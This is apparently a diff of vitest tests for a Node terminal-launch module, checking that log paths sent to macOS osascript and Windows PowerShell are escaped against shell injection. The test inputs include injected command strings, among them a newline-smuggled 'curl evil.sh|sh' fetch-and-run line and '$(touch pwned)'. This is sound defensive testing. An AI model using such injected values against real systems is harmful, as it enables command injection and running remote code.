@@ -1,5 +1,6 @@
+import { EventEmitter } from 'node:events'
 import { describe, expect, test, vi } from 'vitest'
-import { buildTerminalLaunch, openTerminal } from '../src/terminal.js'
+import { buildTerminalLaunch, escapeDoubleQuotedShell, openTerminal } from '../src/terminal.js'
 
 const paths = { nodeBin: '/usr/bin/node', tailScript: '/tools/tail.mjs', logPath: '/logs/a b.jsonl' }
 
@@ -19,6 +20,16 @@ describe('buildTerminalLaunch', () => {
     expect(joined).toContain('/logs/a b.jsonl')
   })
 
+  test('darwin osascript neutralizes shell metacharacters in the log path', () => {
+    const evil = '/logs/$(touch pwned)`id`".jsonl'
+    const launch = buildTerminalLaunch('darwin', { ...paths, logPath: evil })
+    const joined = launch?.args.join(' ') ?? ''
+    // path text survives, but every shell metachar is backslash-escaped so nothing expands
+    expect(joined).toContain('touch pwned')
+    expect(joined).toContain('\\$') // the `$` was backslash-escaped (escaper ran)
+    expect(joined).not.toMatch(/[^\\]\$\(/) // no un-escaped `$(` reaches the shell
+  })
+
   test('win32 launches PowerShell Start-Process in a new window', () => {
     const launch = buildTerminalLaunch('win32', {
       nodeBin: 'C:\\node\\node.exe',
@@ -31,6 +42,24 @@ describe('buildTerminalLaunch', () => {
     expect(joined).toContain('C:\\node\\node.exe')
     expect(joined).toContain('C:\\tool\\tail.mjs')
     expect(joined).toContain('C:\\logs\\a.jsonl')
+  })
+
+  test('win32 wraps ArgumentList elements in double-quotes so a spaced path stays one token', () => {
+    const launch = buildTerminalLaunch('win32', {
+      nodeBin: 'C:\\node\\node.exe',
+      tailScript: 'C:\\tool\\tail.mjs',
+      logPath: 'C:\\Users\\Jane Doe\\p\\.codex-flow\\live\\a.jsonl',
+    })
+    const joined = launch?.args.join(' ') ?? ''
+    // embedded double-quotes around the spaced path (Start-Process joins ArgumentList with spaces)
+    expect(joined).toContain('"C:\\Users\\Jane Doe\\p\\.codex-flow\\live\\a.jsonl"')
+  })
+
+  test('darwin osascript collapses newlines in the log path (no do-script command injection)', () => {
+    const launch = buildTerminalLaunch('darwin', { ...paths, logPath: '/logs/x\ncurl evil.sh|sh\n.jsonl' })
+    const joined = launch?.args.join(' ') ?? ''
+    // no raw newline survives into the AppleScript `do script` argument
+    expect(joined).not.toContain('\n')
   })
 
   test('linux runs the detected emulator with its exec flag before the command', () => {
@@ -112,5 +141,36 @@ describe('openTerminal', () => {
     })
 
     expect(opened).toBe(false)
+  })
+
+  test('attaches an error listener so an async spawn error does not crash the process', () => {
+    const child = new EventEmitter() as EventEmitter & { unref: () => void }
+    child.unref = () => {}
+    const spawnFn = vi.fn(() => child)
+
+    const opened = openTerminal('/logs/a.jsonl', {
+      platform: 'darwin',
+      nodeBin: '/usr/bin/node',
+      tailScript: '/tools/tail.mjs',
+      commandFile: '/logs/watch.command',
+      spawnFn: spawnFn as never,
+    })
+
+    expect(opened).toBe(true)
+    // Node throws on an 'error' event with no listener; openTerminal must have attached one.
+    expect(() => child.emit('error', new Error('ENOENT: osascript missing'))).not.toThrow()
+  })
+})
+
+describe('escapeDoubleQuotedShell', () => {
+  test('escapes backslash, double-quote, backtick and dollar', () => {
+    expect(escapeDoubleQuotedShell('a"b')).toBe('a\\"b')
+    expect(escapeDoubleQuotedShell('a`b')).toBe('a\\`b')
+    expect(escapeDoubleQuotedShell('a$b')).toBe('a\\$b')
+    expect(escapeDoubleQuotedShell('a\\b')).toBe('a\\\\b')
+  })
+
+  test('leaves ordinary paths untouched', () => {
+    expect(escapeDoubleQuotedShell('/logs/a b.jsonl')).toBe('/logs/a b.jsonl')
   })
 })
